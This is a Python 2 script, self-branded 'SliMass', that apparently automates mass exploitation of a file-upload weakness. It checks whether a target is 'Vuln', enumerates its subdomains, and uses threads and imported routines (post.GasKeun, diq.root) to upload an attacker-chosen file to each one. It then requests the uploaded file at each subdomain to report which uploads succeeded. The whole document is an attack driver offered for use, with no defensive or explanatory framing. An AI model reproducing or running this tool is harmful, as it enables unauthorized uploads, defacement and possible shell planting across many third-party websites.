import re,sys,os,requests
from include import diq,post
from time import sleep


sub_list = []

def param_check():
	try:
		a = sys.argv[1]
	except IndexError:
		print("Usage python2 manual.py file.txt")
		os.sys.exit()

def up(subdo, data, files ,target):
	for x in subdo:
		e = post.GasKeun(target, sys.argv[1], x, data)
		sleep(0.1)
		e.daemon = True
		e.start()

def root(subdo, data, files ,target):
	for x in subdo:
		diq.root(target, sys.argv[1], x, data)

def about():
	print('  \033[1;31m  / _ \ ')
	print('  \_\(_)/_/')
	print('   _//"\\\_')
	print('    /   \  \033[1;37mSliMass..\n')


def result():
	for x in sub_list:
		try:
			r = requests.get(x)
			if r.status_code == 200:
				if open(sys.argv[1],'rb').read().strip() in r.text.strip():
					print("\033[1;32m%s" % (x))
				else:
					print("\033[1;31m%s" % (x))
			else:
				print("\033[1;31m%s" % (x))
		except:
			print("\033[1;31m%s" % (x))
	print("\n")
	clear()

def clear():
	for x in sub_list:
		del(sub_list[sub_list.index(x)])

def main():
	while True:
		target = raw_input("\033[1;37m[ \033[1;31mGRT \033[1;37m]> ")
		print("\n")
		if s.check(target) == "1":
			#print("Vuln")
			files = {'file2attach': open(sys.argv[1],'rb')}
			#print(diq.regex(target))
			subdo = s.subdo(diq.regex(target))
			for x in subdo:
				sub_list.append("http://{}.{}/{}".format(x, diq.regex(target), sys.argv[1]))
			up(subdo, 1, files, target)
			root(subdo, 1, files, target)
			result()
		elif s.check(target) == "2":
			files = {'file2attach': open(sys.argv[1],'rb')}
			subdo = s.subdo(diq.regex(target))
			for x in subdo:
				sub_list.append("http://{}.{}/{}".format(x, diq.regex(target), sys.argv[1]))
			#print("Vuln")
			up(subdo, 2, files, target)
			root(subdo, 1, files, target)
			result()
		else:
			print("Not Vuln")

if __name__ == "__main__":
	about()
	param_check()
	s = diq.Gas()
	main()
